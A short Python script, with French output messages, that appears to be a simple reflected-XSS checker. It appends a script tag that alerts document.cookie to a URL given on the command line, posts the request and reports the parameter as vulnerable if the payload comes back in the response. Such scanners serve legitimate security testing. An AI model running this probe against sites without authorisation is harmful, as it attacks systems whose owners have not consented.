import requests
import sys

url = sys.argv[1]
payloads = ['<script>alert(document.cookie);</script>']

for payload in payloads:
    req = requests.post(url + payload)
    if payload in req.text:
        print("Le paramétre est vulnérable \r\n")
        print(("Payload utilisé : " + payload))
        print(req.text)

        break
